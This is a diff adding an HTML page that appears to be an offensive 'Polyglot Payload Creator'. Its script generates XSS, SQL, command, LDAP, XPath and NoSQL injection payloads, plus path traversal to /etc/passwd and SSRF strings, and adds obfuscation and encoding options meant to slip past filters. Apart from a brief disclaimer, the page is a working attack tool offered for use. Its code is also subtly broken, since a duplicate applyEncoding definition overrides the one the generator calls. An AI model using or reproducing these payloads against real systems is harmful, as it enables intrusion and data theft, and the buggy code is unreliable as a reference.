@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Polyglot Payload Creator</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #000;
+      color: #c58b00;
+      overflow-x: hidden;
+    }
+    video#bg-video {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      min-width: 100vw; min-height: 100vh;
+      object-fit: cover;
+      z-index: -2;
+      opacity: 0.25;
+    }
+    audio#bg-music {
+      position: fixed;
+      z-index: -1;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .container {
+      max-width: 900px;
+      margin: 50px auto;
+      padding: 25px;
+      border-radius: 12px;
+      background: rgba(0, 0, 0, 0.2);
+    }
+    h1, label {
+      color: #c58b00;
+      text-shadow: 1px 1px 3px black;
+    }
+    input[type="text"], textarea, select {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: rgba(0, 0, 0, 0.3);
+      color: #c58b00;
+      border: 1px solid #c58b00;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    .row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    button {
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid #c58b00;
+      color: #c58b00;
+      padding: 10px 15px;
+      margin: 5px 5px 15px 0;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    button:hover {
+      background: rgba(255, 255, 255, 0.1);
+      color: red;
+    }
+    pre {
+      white-space: pre-wrap;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border: 1px solid red;
+      color: #00ffcc;
+      margin: 10px 0;
+      border-radius: 5px;
+      max-height: 340px;
+      overflow-y: auto;
+    }
+    .history { margin-top: 20px; }
+    .history-item {
+      border-bottom: 1px solid red;
+      padding: 5px;
+      font-size: 0.9rem;
+      color: #ff8800;
+    }
+    .hint { font-size: 0.88rem; opacity: 0.9; color: #ffb74d; }
+    @media (max-width: 768px) {
+      .container { margin: 20px 10px; padding: 15px; }
+      .row { grid-template-columns: 1fr; }
+      button { width: 100%; margin: 8px 0; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Background Video -->
+  <video id="bg-video" autoplay muted loop playsinline>
+    <source src="background/1761817527453041720p.mp4" type="video/mp4" />
+    Your browser does not support the video tag.
+  </video>
+  <!-- Background Music -->
+  <audio id="bg-music" loop>
+    <source src="background/Programming___Coding___Hacking_music_vol.18__ANONYMOUS_HEADQUARTERS_(48k).mp3" type="audio/mpeg" />
+    Your browser does not support the audio tag.
+  </audio>
+  <div class="container">
+    <h1>🔀 Polyglot Payload Creator</h1>
+    <label>Payload Type:</label>
+    <select id="payload-type">
+      <option>XSS Polyglot</option>
+      <option>SQL Injection Polyglot</option>
+      <option>Command Injection Polyglot</option>
+      <option>File Inclusion Polyglot</option>
+      <option>LDAP Injection Polyglot</option>
+      <option>XPath Injection Polyglot</option>
+      <option>NoSQL Injection Polyglot</option>
+      <option>SSRF Polyglot</option>
+    </select>
+    <div class="row">
+      <div>
+        <label>Context:</label>
+        <select id="context">
+          <option>HTML Attribute</option>
+          <option>HTML Body</option>
+          <option>JavaScript</option>
+          <option>SQL Query</option>
+          <option>Shell Command</option>
+          <option>URL Parameter</option>
+          <option>JSON</option>
+          <option>XML</option>
+        </select>
+      </div>
+      <div>
+        <label>Encoding:</label>
+        <select id="encoding">
+          <option>None</option>
+          <option>URL Encode</option>
+          <option>Base64</option>
+          <option>Hex</option>
+          <option>HTML Entity</option>
+          <option>Double URL Encode</option>
+        </select>
+      </div>
+    </div>
+    <label>Target Parameter:</label>
+    <input type="text" id="target" placeholder="e.g., search, id, user" />
+    <label>Custom Command:</label>
+    <textarea id="custom-cmd" rows="3" placeholder='e.g., whoami, cat /etc/passwd'></textarea>
+    <label>Additional Options:</label>
+    <textarea id="options" rows="3" placeholder='e.g., obfuscation level, bypass techniques'></textarea>
+    <div class="row">
+      <button onclick="generatePayload()">Generate Payload</button>
+      <button onclick="analyzePayload()">Analyze Payload</button>
+    </div>
+    <div class="row">
+      <button onclick="obfuscatePayload()">Obfuscate Payload</button>
+      <button onclick="applyEncoding()">Apply Encoding</button>
+    </div>
+    <div class="row">
+      <button onclick="copyResult()">Copy Result</button>
+      <button onclick="clearAll()">Clear</button>
+    </div>
+    <div class="hint">Note: This tool generates polyglot payloads for educational purposes only. Use responsibly and only on systems you own or have permission to test.</div>
+    <label>Generated Payload:</label>
+    <pre id="result-box">No payload generated yet...</pre>
+    <div class="history">
+      <h3>History</h3>
+      <div id="history-box"></div>
+    </div>
+  </div>
+  <script>
+    const music = document.getElementById("bg-music");
+    const resultBox = document.getElementById("result-box");
+    const historyBox = document.getElementById("history-box");
+    let history = [];
+    
+    window.addEventListener('click', () => {
+      music.play().catch(() => {});
+    }, { once: true });
+    
+    function generatePayload() {
+      const payloadType = document.getElementById("payload-type").value;
+      const context = document.getElementById("context").value;
+      const encoding = document.getElementById("encoding").value;
+      const target = document.getElementById("target").value.trim();
+      const customCmd = document.getElementById("custom-cmd").value.trim();
+      const options = document.getElementById("options").value.trim();
+      
+      let payload = "";
+      
+      switch(payloadType) {
+        case "XSS Polyglot":
+          payload = generateXSSPolyglot(context, customCmd, options);
+          break;
+        case "SQL Injection Polyglot":
+          payload = generateSQLPolyglot(context, customCmd, options);
+          break;
+        case "Command Injection Polyglot":
+          payload = generateCommandPolyglot(context, customCmd, options);
+          break;
+        case "File Inclusion Polyglot":
+          payload = generateFileInclusionPolyglot(context, customCmd, options);
+          break;
+        case "LDAP Injection Polyglot":
+          payload = generateLDAPPolyglot(context, customCmd, options);
+          break;
+        case "XPath Injection Polyglot":
+          payload = generateXPathPolyglot(context, customCmd, options);
+          break;
+        case "NoSQL Injection Polyglot":
+          payload = generateNoSQLPolyglot(context, customCmd, options);
+          break;
+        case "SSRF Polyglot":
+          payload = generateSSRFPolyglot(context, customCmd, options);
+          break;
+      }
+      
+      // Apply encoding if selected
+      if (encoding !== "None") {
+        payload = applyEncoding(payload, encoding);
+      }
+      
+      resultBox.textContent = payload;
+      logHistory(`${payloadType}`, `Generated for ${target || "general"}`);
+    }
+    
+    function generateXSSPolyglot(context, customCmd, options) {
+      let payload = "";
+      
+      switch(context) {
+        case "HTML Attribute":
+          payload = `'" onmouseover=alert(document.domain) x='`;
+          break;
+        case "HTML Body":
+          payload = `<svg/onload=alert(document.domain)>`;
+          break;
+        case "JavaScript":
+          payload = `';alert(String.fromCharCode(88,83,83));//`;
+          break;
+        case "URL Parameter":
+          payload = `javascript:alert(document.domain)`;
+          break;
+        case "JSON":
+          payload = `{"__proto__":{"alert":alert(1)}}`;
+          break;
+        case "XML":
+          payload = `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>`;
+          break;
+        default:
+          payload = `';alert(String.fromCharCode(88,83,83));//`;
+      }
+      
+      if (customCmd) {
+        payload = payload.replace(/alert\(document\.domain\)|alert\(1\)/g, `alert('${customCmd}')`);
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateXSS(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateSQLPolyglot(context, customCmd, options) {
+      let payload = "";
+      
+      switch(context) {
+        case "SQL Query":
+          payload = `' OR 1=1--`;
+          break;
+        case "URL Parameter":
+          payload = `1' OR 1=1--`;
+          break;
+        case "JSON":
+          payload = `"username": "admin' OR 1=1--"`;
+          break;
+        case "XML":
+          payload = `<username>admin' OR 1=1--</username>`;
+          break;
+        default:
+          payload = `' OR 1=1--`;
+      }
+      
+      if (customCmd) {
+        payload = payload.replace(/1=1/g, `1='${customCmd}'`);
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateSQL(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateCommandPolyglot(context, customCmd, options) {
+      let payload = "";
+      const command = customCmd || "whoami";
+      
+      switch(context) {
+        case "Shell Command":
+          payload = `; ${command} #`;
+          break;
+        case "URL Parameter":
+          payload = `;${command};#`;
+          break;
+        case "JSON":
+          payload = `"command": "; ${command} #"`;
+          break;
+        case "XML":
+          payload = `<command>; ${command} #</command>`;
+          break;
+        default:
+          payload = `; ${command} #`;
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateCommand(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateFileInclusionPolyglot(context, customCmd, options) {
+      let payload = "";
+      const file = customCmd || "/etc/passwd";
+      
+      switch(context) {
+        case "URL Parameter":
+          payload = `../../../../..${file}`;
+          break;
+        case "Shell Command":
+          payload = `cat ../../../..${file}`;
+          break;
+        case "JSON":
+          payload = `"file": "../../../../..${file}"`;
+          break;
+        case "XML":
+          payload = `<file>../../../../..${file}</file>`;
+          break;
+        default:
+          payload = `../../../../..${file}`;
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateFileInclusion(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateLDAPPolyglot(context, customCmd, options) {
+      let payload = "";
+      
+      switch(context) {
+        case "URL Parameter":
+          payload = `*)(uid=*))(|(uid=*))`;
+          break;
+        case "Shell Command":
+          payload = `*)(uid=*))(|(uid=*))`;
+          break;
+        case "JSON":
+          payload = `"username": "*)(uid=*))(|(uid=*))"`;
+          break;
+        case "XML":
+          payload = `<username>*)(uid=*))(|(uid=*))</username>`;
+          break;
+        default:
+          payload = `*)(uid=*))(|(uid=*))`;
+      }
+      
+      if (customCmd) {
+        payload = payload.replace(/uid=\*\)/g, `uid=${customCmd})`);
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateLDAP(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateXPathPolyglot(context, customCmd, options) {
+      let payload = "";
+      
+      switch(context) {
+        case "URL Parameter":
+          payload = `' or '1'='1`;
+          break;
+        case "Shell Command":
+          payload = `' or '1'='1`;
+          break;
+        case "JSON":
+          payload = `"query": "' or '1'='1"`;
+          break;
+        case "XML":
+          payload = `<query>' or '1'='1</query>`;
+          break;
+        default:
+          payload = `' or '1'='1`;
+      }
+      
+      if (customCmd) {
+        payload = payload.replace(/'1'='1/g, `'${customCmd}'='1`);
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateXPath(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateNoSQLPolyglot(context, customCmd, options) {
+      let payload = "";
+      
+      switch(context) {
+        case "JSON":
+          payload = `{"$ne": null}`;
+          break;
+        case "URL Parameter":
+          payload = `username[$ne]=null`;
+          break;
+        case "Shell Command":
+          payload = `{"$ne": null}`;
+          break;
+        case "XML":
+          payload = `<query>{"$ne": null}</query>`;
+          break;
+        default:
+          payload = `{"$ne": null}`;
+      }
+      
+      if (customCmd) {
+        payload = payload.replace(/null/g, `"${customCmd}"`);
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateNoSQL(payload);
+      }
+      
+      return payload;
+    }
+    
+    function generateSSRFPolyglot(context, customCmd, options) {
+      let payload = "";
+      const url = customCmd || "http://127.0.0.1:80";
+      
+      switch(context) {
+        case "URL Parameter":
+          payload = `http://127.0.0.1:80@${url}`;
+          break;
+        case "Shell Command":
+          payload = `curl ${url}`;
+          break;
+        case "JSON":
+          payload = `"url": "http://127.0.0.1:80@${url}"`;
+          break;
+        case "XML":
+          payload = `<url>http://127.0.0.1:80@${url}</url>`;
+          break;
+        default:
+          payload = `http://127.0.0.1:80@${url}`;
+      }
+      
+      if (options.includes("obfuscate")) {
+        payload = obfuscateSSRF(payload);
+      }
+      
+      return payload;
+    }
+    
+    function applyEncoding(payload, encoding) {
+      switch(encoding) {
+        case "URL Encode":
+          return encodeURIComponent(payload);
+        case "Base64":
+          return btoa(payload);
+        case "Hex":
+          return Array.from(payload)
+            .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
+            .join('\\x');
+        case "HTML Entity":
+          return payload.replace(/./g, c => `&#${c.charCodeAt(0)};`);
+        case "Double URL Encode":
+          return encodeURIComponent(encodeURIComponent(payload));
+        default:
+          return payload;
+      }
+    }
+    
+    function obfuscatePayload() {
+      const payload = resultBox.textContent;
+      if (!payload || payload === "No payload generated yet...") {
+        resultBox.textContent = "❌ No payload to obfuscate. Generate payload first.";
+        return;
+      }
+      
+      const payloadType = document.getElementById("payload-type").value;
+      let obfuscated = "";
+      
+      switch(payloadType) {
+        case "XSS Polyglot":
+          obfuscated = obfuscateXSS(payload);
+          break;
+        case "SQL Injection Polyglot":
+          obfuscated = obfuscateSQL(payload);
+          break;
+        case "Command Injection Polyglot":
+          obfuscated = obfuscateCommand(payload);
+          break;
+        case "File Inclusion Polyglot":
+          obfuscated = obfuscateFileInclusion(payload);
+          break;
+        case "LDAP Injection Polyglot":
+          obfuscated = obfuscateLDAP(payload);
+          break;
+        case "XPath Injection Polyglot":
+          obfuscated = obfuscateXPath(payload);
+          break;
+        case "NoSQL Injection Polyglot":
+          obfuscated = obfuscateNoSQL(payload);
+          break;
+        case "SSRF Polyglot":
+          obfuscated = obfuscateSSRF(payload);
+          break;
+      }
+      
+      resultBox.textContent = obfuscated;
+      logHistory("Obfuscation", "Applied successfully");
+    }
+    
+    function obfuscateXSS(payload) {
+      // Simple XSS obfuscation by splitting strings and using eval
+      return `eval(String.fromCharCode(${payload.split('').map(c => c.charCodeAt(0)).join(',')}))`;
+    }
+    
+    function obfuscateSQL(payload) {
+      // Simple SQL obfuscation by using comments and case variation
+      return payload.replace(/OR/g, 'oR').replace(/--/g, '-- /* comment */');
+    }
+    
+    function obfuscateCommand(payload) {
+      // Simple command obfuscation by using variables
+      return `a=${payload.split(' ')[0]};b=${payload.split(' ')[1]};$a $b`;
+    }
+    
+    function obfuscateFileInclusion(payload) {
+      // Simple file inclusion obfuscation by using environment variables
+      return payload.replace(/\.\.\//g, '${PWD}/../');
+    }
+    
+    function obfuscateLDAP(payload) {
+      // Simple LDAP obfuscation by using whitespace
+      return payload.replace(/\*/g, ' * ');
+    }
+    
+    function obfuscateXPath(payload) {
+      // Simple XPath obfuscation by using concatenation
+      return payload.replace(/'/g, '"\'"');
+    }
+    
+    function obfuscateNoSQL(payload) {
+      // Simple NoSQL obfuscation by using alternative syntax
+      return payload.replace(/\$ne/g, '$notEqual');
+    }
+    
+    function obfuscateSSRF(payload) {
+      // Simple SSRF obfuscation by using URL encoding
+      return payload.replace(/http:\/\//g, 'h%74tp://');
+    }
+    
+    function applyEncoding() {
+      const payload = resultBox.textContent;
+      if (!payload || payload === "No payload generated yet...") {
+        resultBox.textContent = "❌ No payload to encode. Generate payload first.";
+        return;
+      }
+      
+      const encoding = document.getElementById("encoding").value;
+      if (encoding === "None") {
+        resultBox.textContent = "❌ Please select an encoding first.";
+        return;
+      }
+      
+      const encoded = applyEncoding(payload, encoding);
+      resultBox.textContent = encoded;
+      logHistory("Encoding", `Applied ${encoding} encoding`);
+    }
+    
+    function analyzePayload() {
+      const payload = resultBox.textContent;
+      if (!payload || payload === "No payload generated yet...") {
+        resultBox.textContent = "❌ No payload to analyze. Generate payload first.";
+        return;
+      }
+      
+      const payloadType = document.getElementById("payload-type").value;
+      let analysis = {
+        type: payloadType,
+        length: payload.length,
+        special_chars: (payload.match(/[^a-zA-Z0-9\s]/g) || []).length,
+        encoding_detected: detectEncoding(payload),
+        potential_bypasses: [],
+        context_advice: ""
+      };
+      
+      // Detect encoding
+      function detectEncoding(p) {
+        if (/^[\w\d=\/+]+$/.test(p) && p.length % 4 === 0) return "Base64";
+        if (/%[0-9A-Fa-f]{2}/.test(p)) return "URL";
+        if (/\\x[0-9A-Fa-f]{2}/.test(p)) return "Hex";
+        if (/&#\d+;/.test(p)) return "HTML Entity";
+        return "None";
+      }
+      
+      // Detect potential bypasses
+      if (payload.includes("'") && payload.includes('"')) {
+        analysis.potential_bypasses.push("Mixed quotes to break out of different contexts");
+      }
+      if (payload.includes("/*") || payload.includes("--")) {
+        analysis.potential_bypasses.push("Comments to break query structure");
+      }
+      if (payload.includes("$") || payload.includes("{")) {
+        analysis.potential_bypasses.push("Variable substitution");
+      }
+      
+      // Context advice
+      const context = document.getElementById("context").value;
+      switch(context) {
+        case "HTML Attribute":
+          analysis.context_advice = "Try breaking out with quotes or event handlers";
+          break;
+        case "HTML Body":
+          analysis.context_advice = "Use HTML tags or event handlers";
+          break;
+        case "JavaScript":
+          analysis.context_advice = "Break out of strings or use function calls";
+          break;
+        case "SQL Query":
+          analysis.context_advice = "Use comments, boolean logic, or union operations";
+          break;
+        case "Shell Command":
+          analysis.context_advice = "Use command separators or substitution";
+          break;
+        case "URL Parameter":
+          analysis.context_advice = "Try URL encoding or parameter pollution";
+          break;
+        case "JSON":
+          analysis.context_advice = "Break out with quotes or special characters";
+          break;
+        case "XML":
+          analysis.context_advice = "Use CDATA or entity encoding";
+          break;
+      }
+      
+      resultBox.textContent = JSON.stringify(analysis, null, 2);
+      logHistory("Analysis", `Completed for ${payloadType}`);
+    }
+    
+    function copyResult() {
+      const text = resultBox.textContent;
+      if (!text || text === "No payload generated yet...") return alert("Nothing to copy!");
+      navigator.clipboard.writeText(text).then(() => alert("Payload copied!"));
+    }
+    
+    function clearAll() {
+      document.getElementById("payload-type").value = "XSS Polyglot";
+      document.getElementById("context").value = "HTML Attribute";
+      document.getElementById("encoding").value = "None";
+      document.getElementById("target").value = "";
+      document.getElementById("custom-cmd").value = "";
+      document.getElementById("options").value = "";
+      resultBox.textContent = "No payload generated yet...";
+    }
+    
+    function logHistory(target, snippet) {
+      const time = new Date().toLocaleTimeString();
+      const line = `${time} - ${target}: ${snippet}`;
+      history.unshift(line);
+      updateHistory();
+    }
+    
+    function updateHistory() {
+      historyBox.innerHTML = "";
+      history.slice(0, 8).forEach(entry => {
+        const div = document.createElement("div");
+        div.className = "history-item";
+        div.textContent = entry;
+        historyBox.appendChild(div);
+      });
+    }
+  </script>
+</body>
+</html>
